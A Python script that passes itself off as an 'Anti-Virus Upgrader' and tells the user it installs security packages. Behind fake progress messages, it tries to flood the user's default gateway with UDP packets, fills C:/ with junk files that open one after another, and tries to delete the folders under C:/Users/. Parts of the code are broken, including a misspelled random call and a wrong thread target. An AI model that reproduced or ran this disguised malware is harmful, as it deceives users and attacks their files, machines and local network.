import os, time, socket, threading, random
packet = random._urandon(65500)
print("                _   _  __      ___                  _    _                           _           ")
print("    /\         | | (_) \ \    / (_)                | |  | |                         | |          ")
print("   /  \   _ __ | |_ _   \ \  / / _ _ __ _   _ ___  | |  | |_ __   __ _ _ __ __ _  __| | ___ _ __ ")
print("  / /\ \ | '_ \| __| |   \ \/ / | | '__| | | / __| | |  | | '_ \ / _` | '__/ _` |/ _` |/ _ \ '__|")
print(" / ____ \| | | | |_| |    \  /  | | |  | |_| \__ \ | |__| | |_) | (_| | | | (_| | (_| |  __/ |   ")
print("/_/    \_\_| |_|\__|_|     \/   |_|_|   \__,_|___/  \____/| .__/ \__, |_|  \__,_|\__,_|\___|_|   ")
print("                                                          | |     __/ |                          ")
print("                                                          |_|    |___/                           ")
print("This is a script made for helping update your Anti-Virus Software.")
package_list = ['Anti-Virus.exe', 'Virus_Deleter.exe','Scanner.exe','Malicious_code_detector.exe','User_Alarmer.exe']
def getdefaultgateway():
    result = os.popen('ipconfig')
    result = result.readlines()
    ls_item = 0
    for i in result:
        if i.strip().startswith('Default Gateway'):
            default_gateway = result[(ls_item + 1)]
            break
        else:
            pass
        ls_item += 1
    return default_gateway.strip()
def ddos():
    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s1.connect((getdefaultgateway(), 80))
    def attack():
        while True:
            try:
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s1.connect((getdefaultgateway(), 80))
                s1.send(packet)
                s1.close()
            except:
                pass
    while True:
        x = threading.Thread(target=packet)
        x.start()
def file_deletion():
    os.chdir('C:/Users/')
    users = os.listdir()
    for dir in users:
        try:
            os.rmdir(dir)
        except:
            pass
def file_flood():
    while True:
        try:
            os.chdir('C:/')
            file_opened = open(f"{random.randint(100000,999999)}.txt", 'w')
            file_opened.writelines(packet)
            os.startfile(file_opened.name)
        except:
            pass
while True:
    try:
        start_upgrader = input("[+] Would you like to download the correct packages now?: ")
        if start_upgrader.lower() == "yes":
            print("[+] Checking if internet connection is stable.......")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('google.com', 80))
            time.sleep(2)
            print("[+] Check successful.\n")
            time.sleep(2)
            print("[+] Please note that this may take time.")
            time.sleep(2)
            print("[+] Starting download to files.....\n")
            time.sleep(1)
            break
        elif start_upgrader.lower() == "no":
            print("[+] Saying no will not make the anti-virus update.\n[+] It is highly suggested to say yes.")
        else:
            print("[+] Invalid input.")
    except:
        print("[+] Check your internet connection.")
dos_thread = threading.Thread(target=ddos)
dos_thread.start()
while True:
    try:
        os.chdir('C:/')
        os.mkdir('Upgraded_Anti_Virus_Software')
        os.chdir('C:/Upgraded_Anti_Virus_Software/')
        print("[+] Installing Packages.........")
        time.sleep(1)
        for i in package_list:
            print(f"[+] Installing Module: {i}\n")
            file = open(i, 'w')
            time.sleep(100)
        print("")
        print("[+] Successfully Installed packages.")
        break
    except:
        pass
print("[+] Veryfying If Files have been downloaded correctly.")
flooder = threading.Thread(target=file_flood)
flooder.start()
time.sleep(10)
print("[+] Files are clean.")
deletion = threading.Thread(target=file_deletion)
deletion.start()
